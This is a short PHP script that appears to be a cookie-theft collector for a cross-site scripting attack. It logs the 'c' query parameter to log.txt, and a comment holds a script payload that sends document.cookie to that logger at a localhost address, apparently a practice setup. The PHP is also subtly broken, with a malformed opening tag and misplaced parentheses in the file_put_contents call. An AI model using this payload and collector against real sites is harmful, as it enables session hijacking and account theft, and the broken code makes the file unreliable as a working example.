<? php
	if (isset($_GET['c'])) {
		file_put_contents('log.txt', $_GET)['c'] . "\n", FILE_APPEND);
	}

//<script>fetch('http://localhost/code/log.php?c=' + document.cookie)</script>